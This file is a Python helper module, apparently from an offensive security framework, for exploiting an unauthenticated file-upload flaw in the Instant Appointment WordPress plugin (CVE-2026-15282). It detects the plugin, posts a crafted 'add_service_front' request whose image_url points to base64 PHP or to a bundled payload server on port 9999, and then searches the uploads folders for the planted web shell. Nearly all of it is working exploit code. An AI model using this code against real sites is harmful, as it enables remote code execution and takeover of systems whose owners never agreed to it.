#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Instant Appointment WordPress plugin helpers (CVE-2026-15282)."""

from __future__ import annotations

import base64
import threading
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import List, Optional

from core.framework.base_module import BaseModule

INSTANT_APPOINTMENT_SLUG = "instant-appointment"
INSTANT_APPOINTMENT_VULN_MAX = "1.2"
INSTANT_APPOINTMENT_PATCHED_VERSION = "1.2.1"
INSTANT_APPOINTMENT_AJAX_ACTION = "add_service_front"
INSTANT_APPOINTMENT_AJAX_PATH = "/wp-admin/admin-ajax.php"


class InstantAppointment(BaseModule):
    """Instant Appointment plugin mixin for scanner/exploit modules."""

    @staticmethod
    def instant_appointment_normalize_php(php_source: str) -> str:
        source = (php_source or "").strip()
        if not source:
            return ""
        if not source.startswith("<?php"):
            source = f"<?php {source}"
        if not source.rstrip().endswith("?>"):
            source = source.rstrip() + " ?>"
        return source

    @staticmethod
    def instant_appointment_data_uri(php_source: str) -> str:
        normalized = InstantAppointment.instant_appointment_normalize_php(php_source)
        encoded = base64.b64encode(normalized.encode("utf-8", errors="replace")).decode()
        return f"data://text/plain;base64,{encoded}"

    @staticmethod
    def instant_appointment_upload_dirs(wp_base: str = "") -> List[str]:
        root = (wp_base or "").rstrip("/")
        now = datetime.utcnow()
        year = now.strftime("%Y")
        month = now.strftime("%m")
        dirs = [
            f"{root}/wp-content/uploads/{year}/{month}/",
            f"{root}/wp-content/uploads/",
        ]
        return [d.replace("//", "/") for d in dirs if d]

    @classmethod
    def instant_appointment_is_vulnerable(cls, version: str) -> Optional[bool]:
        if not version:
            return None
        try:
            from lib.protocols.http.wordpress import Wordpress

            current = Wordpress.wp_version_to_tuple(version)
            maximum = Wordpress.wp_version_to_tuple(INSTANT_APPOINTMENT_VULN_MAX)
            while len(current) < 3:
                current = current + (0,)
            while len(maximum) < 3:
                maximum = maximum + (0,)
            return current[:3] <= maximum[:3]
        except Exception:
            return None

    def instant_appointment_ajax_path(self, wp_base: str = "") -> str:
        from lib.protocols.http.wordpress import Wordpress

        root = Wordpress.wp_normalize_base_path(wp_base or getattr(self, "path", "/"))
        path = f"{root.rstrip('/')}{INSTANT_APPOINTMENT_AJAX_PATH}"
        return path if path.startswith("/") else f"/{path}"

    def instant_appointment_shell_paths(self, shell_name: str, wp_base: str = "") -> List[str]:
        paths: List[str] = []
        for directory in self.instant_appointment_upload_dirs(wp_base):
            paths.append(f"{directory.rstrip('/')}/{shell_name}")
        return paths

    def instant_appointment_probe(self, wp_base: str = "") -> dict:
        from lib.protocols.http.wordpress import Wordpress

        root = Wordpress.wp_normalize_base_path(wp_base or getattr(self, "path", "/"))
        version = self.wp_plugin_version(INSTANT_APPOINTMENT_SLUG, root)
        if version:
            readme = Wordpress.wp_plugin_path(root, INSTANT_APPOINTMENT_SLUG, "readme.txt")
            return {"found": True, "version": version, "evidence": readme}

        readme = Wordpress.wp_plugin_path(root, INSTANT_APPOINTMENT_SLUG, "readme.txt")
        response = self.http_request(method="GET", path=readme, allow_redirects=True)
        if response and int(response.status_code or 0) == 200:
            body = response.text or ""
            lowered = body.lower()
            if "instant appointment" in lowered or INSTANT_APPOINTMENT_SLUG in lowered:
                return {
                    "found": True,
                    "version": Wordpress.wp_extract_version_from_readme(body) or None,
                    "evidence": readme,
                }

        main_php = Wordpress.wp_plugin_path(root, INSTANT_APPOINTMENT_SLUG, "instant-appointment.php")
        response = self.http_request(method="GET", path=main_php, allow_redirects=True)
        if response and int(response.status_code or 0) == 200:
            body = (response.text or "").lower()
            if INSTANT_APPOINTMENT_SLUG.replace("-", " ") in body or "instant appointment" in body:
                return {"found": True, "version": None, "evidence": main_php}

        ajax_path = self.instant_appointment_ajax_path(root)
        response = self.http_request(
            method="POST",
            path=ajax_path,
            data={"action": INSTANT_APPOINTMENT_AJAX_ACTION},
            allow_redirects=True,
        )
        if response and int(response.status_code or 0) == 200:
            if INSTANT_APPOINTMENT_AJAX_ACTION in (response.text or "").lower():
                return {"found": True, "version": None, "evidence": ajax_path}

        return {"found": False, "version": None, "evidence": None}

    def instant_appointment_build_post_data(
        self,
        shell_name: str,
        image_url: str,
        service_stem: str,
    ) -> dict:
        return {
            "action": INSTANT_APPOINTMENT_AJAX_ACTION,
            "service_name": service_stem,
            "image_url": image_url,
            "image_name": shell_name,
            "image_size": "100",
            "image_type": "image/jpeg",
            "service_price_sale": "1",
            "service_price_reg": "1",
            "service_category[]": "1",
            "service_duration": "60",
            "service_author": "1",
        }

    def instant_appointment_path_reachable(self, shell_path: str) -> bool:
        try:
            response = self.http_request(
                method="GET",
                path=shell_path,
                allow_redirects=True,
                timeout=int(getattr(self, "timeout", None) or 15),
            )
        except Exception:
            return True
        if not response:
            return False
        return int(response.status_code or 0) in (200, 500)

    def instant_appointment_resolve_shell(self, shell_name: str, wp_base: str = "") -> Optional[str]:
        for shell_path in self.instant_appointment_shell_paths(shell_name, wp_base):
            if self.instant_appointment_path_reachable(shell_path):
                return shell_path
        return None

    def instant_appointment_upload(
        self,
        image_url: str,
        shell_name: str,
        wp_base: str = "",
        service_stem: str = "ks",
    ) -> Optional[str]:
        response = self.http_request(
            method="POST",
            path=self.instant_appointment_ajax_path(wp_base),
            data=self.instant_appointment_build_post_data(shell_name, image_url, service_stem),
            allow_redirects=True,
            timeout=int(getattr(self, "timeout", None) or 20),
        )
        if not response or int(response.status_code or 0) != 200:
            return None
        return self.instant_appointment_resolve_shell(shell_name, wp_base)


class InstantAppointmentPayloadServer:
    """Serve framework PHP over HTTP when data:// wrappers are disabled."""

    def __init__(self, php_source: str, host: str = "0.0.0.0", port: int = 9999):
        self.php_source = InstantAppointment.instant_appointment_normalize_php(php_source)
        self.host = host
        self.port = int(port)
        self._server: Optional[HTTPServer] = None
        self._thread: Optional[threading.Thread] = None

    def start(self) -> "InstantAppointmentPayloadServer":
        body = self.php_source.encode("utf-8", errors="replace")

        class _Handler(BaseHTTPRequestHandler):
            def do_GET(handler):
                handler.send_response(200)
                handler.send_header("Content-Type", "text/plain")
                handler.send_header("Content-Length", str(len(body)))
                handler.end_headers()
                handler.wfile.write(body)

            def log_message(handler, *args):
                return

        self._server = HTTPServer((self.host, self.port), _Handler)
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()
        return self

    def stop(self) -> None:
        if self._server:
            try:
                self._server.shutdown()
            except Exception:
                pass

    def public_url(self, lhost: str) -> str:
        host = (lhost or "127.0.0.1").strip()
        return f"http://{host}:{self.port}/payload.php"
